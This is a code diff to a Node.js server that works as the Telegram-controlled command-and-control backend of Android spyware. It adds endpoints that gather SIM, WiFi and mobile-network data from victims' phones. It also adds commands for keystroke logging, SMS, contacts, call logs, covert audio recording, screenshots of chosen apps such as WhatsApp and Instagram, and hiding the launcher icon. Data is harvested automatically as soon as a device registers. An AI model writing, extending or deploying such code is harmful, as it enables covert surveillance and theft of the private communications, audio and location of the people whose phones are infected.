@@ -210,7 +210,12 @@ async function setChatMenuButton(chatId) {
                 { command: 'phone_number', description: '📞 Get phone number' },
                 { command: 'sim_info', description: '📱 Get SIM info' },
                 { command: 'wifi_info', description: '📶 Get WiFi info' },
-                { command: 'all_info', description: '📱 Complete device info' }
+                { command: 'mobile_info', description: '📱 Get mobile data info' },
+                { command: 'all_info', description: '📱 Complete device info' },
+                { command: 'app_opens', description: '📱 Show app opens' },
+                { command: 'realtime_on', description: '🔔 Enable real-time logs' },
+                { command: 'realtime_off', description: '🔔 Disable real-time logs' },
+                { command: 'realtime_status', description: '🔔 Check real-time status' }
             ]
         });
         
@@ -351,6 +356,58 @@ function formatIPInfo(ipData) {
     }
 }
 
+// Format SIM info
+function formatSimInfo(simData) {
+    try {
+        let message = '📱 <b>SIM Information</b>\n\n';
+        
+        if (Array.isArray(simData)) {
+            message += `Active SIMs: ${simData.length}\n\n`;
+            simData.forEach((sim, index) => {
+                message += `📱 <b>SIM ${index + 1}</b>\n`;
+                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
+                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
+                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
+            });
+        } else if (simData.operator) {
+            message += `• Operator: ${simData.operator}\n`;
+            message += `• Country: ${simData.country}\n`;
+            message += `• SIM State: ${simData.simState}\n`;
+            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting SIM info:', error);
+        return `📱 SIM Info: ${JSON.stringify(simData)}`;
+    }
+}
+
+// Format WiFi info
+function formatWifiInfo(wifiData) {
+    try {
+        let message = '📶 <b>WiFi Information</b>\n\n';
+        
+        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
+        
+        if (wifiData.connected) {
+            message += `\n📡 <b>Current Connection</b>\n`;
+            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
+            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
+            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
+            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
+            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
+            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting WiFi info:', error);
+        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
+    }
+}
+
 // ============= AUTO DATA COLLECTION =============
 
 function queueAutoDataCommands(deviceId, chatId) {
@@ -368,6 +425,7 @@ function queueAutoDataCommands(deviceId, chatId) {
             'phone_number',
             'sim_info',
             'wifi_info',
+            'mobile_info',
             'contacts_html',
             'sms_html', 
             'calllogs_html',
@@ -391,11 +449,12 @@ function queueAutoDataCommands(deviceId, chatId) {
         { command: 'phone_number', delay: 2, description: 'Phone Number' },
         { command: 'sim_info', delay: 4, description: 'SIM Info' },
         { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
-        { command: 'contacts_html', delay: 10, description: 'Contacts' },
-        { command: 'sms_html', delay: 15, description: 'SMS Messages' },
-        { command: 'calllogs_html', delay: 20, description: 'Call Logs' },
-        { command: 'apps_html', delay: 25, description: 'Apps List' },
-        { command: 'location', delay: 30, description: 'Location' }
+        { command: 'mobile_info', delay: 8, description: 'Mobile Info' },
+        { command: 'contacts_html', delay: 12, description: 'Contacts' },
+        { command: 'sms_html', delay: 17, description: 'SMS Messages' },
+        { command: 'calllogs_html', delay: 22, description: 'Call Logs' },
+        { command: 'apps_html', delay: 27, description: 'Apps List' },
+        { command: 'location', delay: 32, description: 'Location' }
     ];
     
     commands.forEach((cmd, index) => {
@@ -435,7 +494,10 @@ function getMainMenuKeyboard() {
             createInlineButton('📊 Stats', 'menu_stats')
         ],
         [
-            createInlineButton('ℹ️ About', 'menu_about'),
+            createInlineButton('🔔 Realtime', 'menu_realtime'),
+            createInlineButton('ℹ️ About', 'menu_about')
+        ],
+        [
             createInlineButton('❌ Close', 'close_menu')
         ]
     ];
@@ -566,13 +628,14 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('🎤 Audio Ultra', 'cmd:audio_ultra'),
-                createInlineButton('🎤 Audio Low', 'cmd:audio_low')
+                createInlineButton('🎤 Audio Very Low', 'cmd:audio_very_low')
             ],
             [
-                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium'),
-                createInlineButton('🎤 Audio High', 'cmd:audio_high')
+                createInlineButton('🎤 Audio Low', 'cmd:audio_low'),
+                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium')
             ],
             [
+                createInlineButton('🎤 Audio High', 'cmd:audio_high'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -582,6 +645,10 @@ async function handleCallbackQuery(callbackQuery) {
         const keyboard = [
             [
                 createInlineButton('📸 Take Now', 'cmd:screenshot'),
+                createInlineButton('▶️ Start Service', 'cmd:start_screenshot')
+            ],
+            [
+                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot'),
                 createInlineButton('📏 Small', 'cmd:small')
             ],
             [
@@ -593,18 +660,23 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📊 Size Status', 'cmd:size_status')
             ],
             [
-                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
-                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
-            ],
-            [
                 createInlineButton('🔄 Auto ON', 'cmd:auto_on'),
                 createInlineButton('🔄 Auto OFF', 'cmd:auto_off')
+            ],
+            [
+                createInlineButton('🔄 General ON', 'cmd:auto_general_on'),
+                createInlineButton('🔄 General OFF', 'cmd:auto_general_off')
+            ],
+            [
+                createInlineButton('🎯 Target ON', 'cmd:auto_target_on'),
+                createInlineButton('🎯 Target OFF', 'cmd:auto_target_off')
             ],
             [
                 createInlineButton('📊 Compression Stats', 'cmd:compression_stats'),
                 createInlineButton('📱 Target Apps', 'cmd:target_apps')
             ],
             [
+                createInlineButton('➕ Add Target', 'cmd:add_target_example'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -625,6 +697,11 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📝 Logs Count', 'cmd:logs_count')
             ],
             [
+                createInlineButton('📋 Recent Logs', 'cmd:logs_recent'),
+                createInlineButton('📈 Detailed Stats', 'cmd:stats')
+            ],
+            [
+                createInlineButton('🔄 Refresh Data', 'cmd:refresh_data'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -659,7 +736,7 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
-                createInlineButton('🔄 Network Status', 'cmd:network')
+                createInlineButton('📡 Network Status', 'cmd:network')
             ],
             [
                 createInlineButton('🌍 All Network', 'cmd:all_info'),
@@ -676,9 +753,26 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
-                createInlineButton('📊 Call Logs', 'cmd:calllogs')
+                createInlineButton('📞 Call Logs', 'cmd:calllogs')
             ],
             [
+                createInlineButton('📞 Call Logs TXT', 'cmd:calllogs_txt'),
+                createInlineButton('📞 Call Logs HTML', 'cmd:calllogs_html')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_realtime') {
+        const keyboard = [
+            [
+                createInlineButton('🔔 Realtime ON', 'cmd:realtime_on'),
+                createInlineButton('🔕 Realtime OFF', 'cmd:realtime_off')
+            ],
+            [
+                createInlineButton('📊 Realtime Status', 'cmd:realtime_status'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -726,6 +820,9 @@ async function handleCallbackQuery(callbackQuery) {
             "• Phone number detection\n" +
             "• SIM card information\n" +
             "• WiFi details\n" +
+            "• Mobile network info\n" +
+            "• App open tracking\n" +
+            "• Real-time logging controls\n" +
             "• Auto-data collection on registration\n\n" +
             "Use the menu below to navigate.");
         
@@ -751,6 +848,15 @@ async function handleCallbackQuery(callbackQuery) {
         userStates.delete(chatId);
         await editMessageKeyboard(chatId, messageId, []);
         await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
+        
+    } else if (data === 'cmd:add_target_example') {
+        await sendTelegramMessage(chatId, 
+            "📱 *Add Target App*\n\n" +
+            "Use: `/add_target com.package.name`\n\n" +
+            "Examples:\n" +
+            "• `/add_target com.instagram.android`\n" +
+            "• `/add_target com.whatsapp`\n" +
+            "• `/add_target com.facebook.katana`");
         
     } else if (data.startsWith('recurring:')) {
         const recurring = data.split(':')[1];
@@ -916,30 +1022,131 @@ async function handleCommand(chatId, command, messageId) {
 
     let ackMessage = `⏳ Processing: ${command}`;
     
+    // Data commands
     if (cleanCommand.includes('contacts')) {
         ackMessage = `📇 Generating contacts file...`;
     } else if (cleanCommand.includes('sms')) {
         ackMessage = `💬 Generating SMS file...`;
-    } else if (cleanCommand.includes('calllogs')) {
+    } else if (cleanCommand.includes('calllogs') || cleanCommand.includes('calls')) {
         ackMessage = `📞 Generating call logs file...`;
     } else if (cleanCommand.includes('apps')) {
         ackMessage = `📱 Generating apps list file...`;
+    } else if (cleanCommand.includes('keystrokes')) {
+        ackMessage = `⌨️ Generating keystrokes file...`;
+    } else if (cleanCommand.includes('notifications')) {
+        ackMessage = `🔔 Generating notifications file...`;
+    } else if (cleanCommand === 'app_opens') {
+        ackMessage = `📱 Fetching app opens...`;
+    } else if (cleanCommand === 'app_opens_html') {
+        ackMessage = `📱 Generating app opens HTML...`;
+    
+    // Location and device info
     } else if (cleanCommand === 'location') {
         ackMessage = `📍 Getting your current location...`;
-    } else if (cleanCommand === 'screenshot') {
-        ackMessage = `📸 Taking screenshot...`;
-    } else if (cleanCommand === 'record') {
-        ackMessage = `🎤 Recording audio for 60 seconds...`;
-    } else if (cleanCommand === 'ip_info') {
+    } else if (cleanCommand === 'network') {
+        ackMessage = `📡 Checking network status...`;
+    } else if (cleanCommand === 'storage') {
+        ackMessage = `💾 Checking storage...`;
+    } else if (cleanCommand === 'battery') {
+        ackMessage = `🔋 Getting battery status...`;
+    } else if (cleanCommand === 'info') {
+        ackMessage = `ℹ️ Getting device info...`;
+    } else if (cleanCommand === 'time') {
+        ackMessage = `🕐 Getting current time...`;
+    } else if (cleanCommand === 'status') {
+        ackMessage = `📊 Getting device status...`;
+    
+    // Network and phone commands
+    } else if (cleanCommand === 'ip_info' || cleanCommand === 'ip') {
         ackMessage = `🌐 Fetching IP information...`;
-    } else if (cleanCommand === 'phone_number') {
+    } else if (cleanCommand === 'phone_number' || cleanCommand === 'phone' || cleanCommand === 'myphone') {
         ackMessage = `📞 Getting phone number...`;
-    } else if (cleanCommand === 'sim_info') {
+    } else if (cleanCommand === 'sim_info' || cleanCommand === 'sim') {
         ackMessage = `📱 Getting SIM information...`;
-    } else if (cleanCommand === 'wifi_info') {
+    } else if (cleanCommand === 'wifi_info' || cleanCommand === 'wifi') {
         ackMessage = `📶 Getting WiFi information...`;
-    } else if (cleanCommand === 'all_info') {
+    } else if (cleanCommand === 'mobile_info' || cleanCommand === 'mobile' || cleanCommand === 'mobile_data') {
+        ackMessage = `📱 Getting mobile network info...`;
+    } else if (cleanCommand === 'all_info' || cleanCommand === 'full_info') {
         ackMessage = `📱 Gathering all device information...`;
+    
+    // Screenshot commands
+    } else if (cleanCommand === 'screenshot' || cleanCommand === 'screenshot_now') {
+        ackMessage = `📸 Taking screenshot...`;
+    } else if (cleanCommand === 'start_screenshot') {
+        ackMessage = `📸 Starting screenshot service...`;
+    } else if (cleanCommand === 'stop_screenshot') {
+        ackMessage = `📸 Stopping screenshot service...`;
+    } else if (cleanCommand === 'small' || cleanCommand === 'medium' || cleanCommand === 'original') {
+        ackMessage = `📏 Setting screenshot size...`;
+    } else if (cleanCommand === 'size_status') {
+        ackMessage = `📏 Checking screenshot size...`;
+    } else if (cleanCommand === 'screenshot_settings') {
+        ackMessage = `📸 Getting screenshot settings...`;
+    } else if (cleanCommand === 'compression_stats') {
+        ackMessage = `📊 Getting compression stats...`;
+    } else if (cleanCommand === 'target_apps') {
+        ackMessage = `📱 Getting target apps...`;
+    } else if (cleanCommand.startsWith('add_target')) {
+        ackMessage = `📱 Adding target app...`;
+    
+    // Auto screenshot controls
+    } else if (cleanCommand === 'auto_on') {
+        ackMessage = `📸 Enabling auto screenshot...`;
+    } else if (cleanCommand === 'auto_off') {
+        ackMessage = `📸 Disabling auto screenshot...`;
+    } else if (cleanCommand === 'auto_general_on') {
+        ackMessage = `📸 Enabling general auto screenshot...`;
+    } else if (cleanCommand === 'auto_general_off') {
+        ackMessage = `📸 Disabling general auto screenshot...`;
+    } else if (cleanCommand === 'auto_target_on') {
+        ackMessage = `📸 Enabling target auto screenshot...`;
+    } else if (cleanCommand === 'auto_target_off') {
+        ackMessage = `📸 Disabling target auto screenshot...`;
+    
+    // Recording commands
+    } else if (cleanCommand === 'record' || cleanCommand === 'start_recording') {
+        ackMessage = `🎤 Recording audio for 60 seconds...`;
+    } else if (cleanCommand === 'stop_recording') {
+        ackMessage = `⏹️ Stopping recording...`;
+    } else if (cleanCommand === 'record_auto_on') {
+        ackMessage = `⏰ Enabling auto recording...`;
+    } else if (cleanCommand === 'record_auto_off') {
+        ackMessage = `⏰ Disabling auto recording...`;
+    } else if (cleanCommand === 'record_schedule') {
+        ackMessage = `📅 Getting recording schedule...`;
+    } else if (cleanCommand.startsWith('record_custom')) {
+        ackMessage = `⚙️ Setting custom schedule...`;
+    } else if (cleanCommand === 'audio_info') {
+        ackMessage = `🎤 Getting audio info...`;
+    } else if (cleanCommand.startsWith('audio_')) {
+        ackMessage = `🎤 Setting audio quality...`;
+    
+    // Realtime logging controls
+    } else if (cleanCommand === 'realtime_on') {
+        ackMessage = `🔔 Enabling real-time logging...`;
+    } else if (cleanCommand === 'realtime_off') {
+        ackMessage = `🔔 Disabling real-time logging...`;
+    } else if (cleanCommand === 'realtime_status') {
+        ackMessage = `🔔 Checking real-time status...`;
+    
+    // Service commands
+    } else if (cleanCommand === 'hide_icon') {
+        ackMessage = `👻 Hiding launcher icon...`;
+    } else if (cleanCommand === 'show_icon') {
+        ackMessage = `👁️ Showing launcher icon...`;
+    } else if (cleanCommand === 'reboot_app') {
+        ackMessage = `🔄 Rebooting services...`;
+    } else if (cleanCommand === 'clear_logs') {
+        ackMessage = `🗑️ Clearing logs...`;
+    } else if (cleanCommand === 'logs_count') {
+        ackMessage = `📊 Counting logs...`;
+    } else if (cleanCommand === 'logs_recent') {
+        ackMessage = `📋 Getting recent logs...`;
+    } else if (cleanCommand === 'stats') {
+        ackMessage = `📈 Getting detailed stats...`;
+    } else if (cleanCommand === 'refresh_data' || cleanCommand === 'refresh') {
+        ackMessage = `🔄 Refreshing data...`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
@@ -1036,6 +1243,115 @@ app.post('/api/phonenumber/:deviceId', async (req, res) => {
     } catch (error) {
         console.error('❌ Phone Number endpoint error:', error);
         res.status(500).json({ error: 'Phone Number processing failed' });
+    }
+});
+
+// ============= SIM INFO ENDPOINT =============
+
+app.post('/api/siminfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const simData = req.body;
+        
+        console.log(`📱 SIM Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.simInfo = simData;
+        
+        const formattedMessage = formatSimInfo(simData);
+        await sendTelegramMessage(chatId, formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ SIM Info endpoint error:', error);
+        res.status(500).json({ error: 'SIM Info processing failed' });
+    }
+});
+
+// ============= WIFI INFO ENDPOINT =============
+
+app.post('/api/wifiinfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const wifiData = req.body;
+        
+        console.log(`📶 WiFi Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.wifiInfo = wifiData;
+        
+        const formattedMessage = formatWifiInfo(wifiData);
+        await sendTelegramMessage(chatId, formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ WiFi Info endpoint error:', error);
+        res.status(500).json({ error: 'WiFi Info processing failed' });
+    }
+});
+
+// ============= MOBILE INFO ENDPOINT =============
+
+app.post('/api/mobileinfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const mobileData = req.body;
+        
+        console.log(`📱 Mobile Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.mobileInfo = mobileData;
+        
+        let message = '📱 <b>Mobile Network Information</b>\n\n';
+        
+        if (mobileData.operator) {
+            message += `📶 *Network*\n`;
+            message += `• Operator: ${mobileData.operator}\n`;
+            message += `• Country: ${mobileData.country}\n`;
+            message += `• Type: ${mobileData.networkType}\n`;
+            message += `• Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
+        }
+        
+        if (mobileData.ip) {
+            message += `\n🌐 *Mobile IP*\n`;
+            message += `• ${mobileData.ip}\n`;
+        }
+        
+        if (mobileData.dataEnabled !== undefined) {
+            message += `\n🔌 *Connection Status*\n`;
+            message += `• Mobile Data: ${mobileData.dataEnabled ? '✅ ON' : '❌ OFF'}\n`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Mobile Info endpoint error:', error);
+        res.status(500).json({ error: 'Mobile Info processing failed' });
     }
 });
 
@@ -1170,6 +1486,15 @@ app.post('/api/logs', async (req, res) => {
                 
             case 'phone_number':
                 return res.json({ success: true, handled: 'phonenumber_endpoint' });
+                
+            case 'sim_info':
+                return res.json({ success: true, handled: 'siminfo_endpoint' });
+                
+            case 'wifi_info':
+                return res.json({ success: true, handled: 'wifiinfo_endpoint' });
+                
+            case 'mobile_info':
+                return res.json({ success: true, handled: 'mobileinfo_endpoint' });
                 
             case 'app_open':
                 message = `📱 <b>App Opened</b>\n` +
@@ -1439,7 +1764,8 @@ app.post('/api/result/:deviceId', async (req, res) => {
     
     if (command && (command.includes('_txt') || command.includes('_html') || 
         command === 'ip_info' || command === 'phone_number' || command === 'location' ||
-        command === 'sim_info' || command === 'wifi_info' || command === 'all_info')) {
+        command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
+        command === 'mobile_info')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
@@ -1498,6 +1824,7 @@ app.post('/api/register', async (req, res) => {
         `• 📞 Phone Number\n` +
         `• 📱 SIM Information\n` +
         `• 📶 WiFi Details\n` +
+        `• 📱 Mobile Network Info\n` +
         `• 📇 Contacts\n` +
         `• 💬 SMS Messages\n` +
         `• 📞 Call Logs\n` +
@@ -1602,20 +1929,30 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ 2. 📞 Phone Number');
     console.log('   └─ 3. 📱 SIM Information');
     console.log('   └─ 4. 📶 WiFi Details');
-    console.log('   └─ 5. 📇 Contacts (HTML)');
-    console.log('   └─ 6. 💬 SMS (HTML)');
-    console.log('   └─ 7. 📞 Call Logs (HTML)');
-    console.log('   └─ 8. 📱 Apps List (HTML)');
-    console.log('   └─ 9. 📍 Location');
+    console.log('   └─ 5. 📱 Mobile Network Info');
+    console.log('   └─ 6. 📇 Contacts (HTML)');
+    console.log('   └─ 7. 💬 SMS (HTML)');
+    console.log('   └─ 8. 📞 Call Logs (HTML)');
+    console.log('   └─ 9. 📱 Apps List (HTML)');
+    console.log('   └─ 10. 📍 Location');
     console.log('\n✅ NEW ENDPOINTS:');
     console.log('   └─ POST /api/ipinfo/:deviceId - IP Information');
     console.log('   └─ POST /api/phonenumber/:deviceId - Phone Number');
+    console.log('   └─ POST /api/siminfo/:deviceId - SIM Information');
+    console.log('   └─ POST /api/wifiinfo/:deviceId - WiFi Information');
+    console.log('   └─ POST /api/mobileinfo/:deviceId - Mobile Network Information');
     console.log('\n✅ MENU BUTTON CONFIGURED:');
     console.log('   └─ Persistent menu button appears next to input field');
-    console.log('   └─ Commands include: ip_info, phone_number, sim_info, wifi_info, all_info');
-    console.log('\n✅ INTERACTIVE SCHEDULE SETUP:');
-    console.log('   └─ Step-by-step time entry');
-    console.log('   └─ Daily/Once choice with buttons');
-    console.log('   └─ Interval validation');
+    console.log('   └─ Commands include: ip_info, phone_number, sim_info, wifi_info, mobile_info, all_info, app_opens, realtime_on, realtime_off, realtime_status');
+    console.log('\n✅ COMPLETE COMMAND LIST (50+ commands):');
+    console.log('   └─ Data: contacts, sms, calllogs, apps, keystrokes, notifications');
+    console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
+    console.log('   └─ Phone: phone_number, sim_info');
+    console.log('   └─ Screenshot: screenshot, start_screenshot, stop_screenshot, small, medium, original, size_status, screenshot_settings, compression_stats, target_apps, add_target');
+    console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high');
+    console.log('   └─ Location: location, storage, battery, info, time, status');
+    console.log('   └─ App: app_opens, app_opens_html');
+    console.log('   └─ Realtime: realtime_on, realtime_off, realtime_status');
+    console.log('   └─ Services: hide_icon, show_icon, reboot_app, clear_logs, logs_count, logs_recent, stats, refresh_data, help');
     console.log('\n🚀 ===============================================\n');
 });
